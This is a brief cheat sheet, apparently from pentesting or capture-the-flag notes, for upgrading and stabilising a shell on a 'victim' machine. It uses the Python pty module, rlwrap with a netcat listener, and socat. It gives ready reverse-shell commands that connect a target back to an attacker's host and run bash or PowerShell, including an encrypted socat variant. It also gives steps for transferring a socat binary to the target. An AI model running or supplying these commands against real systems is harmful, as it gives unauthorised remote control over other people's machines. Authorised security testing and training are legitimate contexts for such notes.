     
  
**PYTHON METHOD**  
1) python3 -c 'import pty; pty.spawn("/bin/bash")'  
2) export TERM=xterm  
3) CTRL + Z to background the shell  
4) stty raw -echo; fg  
  
Type ‘reset’ when finished or if shell dies  
  
  
  
  
**If there are wrapping rows/colums issue**  
  
1) stty -a (on own machine)  
2) stty rows <rows> columsn <columns> (on victim shell)  
  
  
  
**RLWRAP METHOD** (useful for Windows shells)  
  
1) rlwrap nc -lvnp <port>  
\*OPTIONAL FOR LINUX\*  
2) CTRL+Z  
3) stty raw -echo; fg  
  
  
  
  
**SOCAT METHOD** (Linux only)  
1) transfer socat static compiled banary to target ([https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))  
2) socat listener: _``socat TCP-L:<port> FILE:`tty`,raw,echo=0``_3) connect back  
Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`  
Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`  
  
  
SHELL=/bin/bash script -q /dev/null  
/bin/sh -i  
  
  
  
  
socat OPENSSL-LISTEN:<port>,cert=encrypt.pem,verify=0 ``FILE:`tty`,raw,echo=0``  
  
`socat OPENSSL:10.10.10.5:<port>,verify=0` EXEC:"bash -li",pty,stderr,sigint,setsid,sane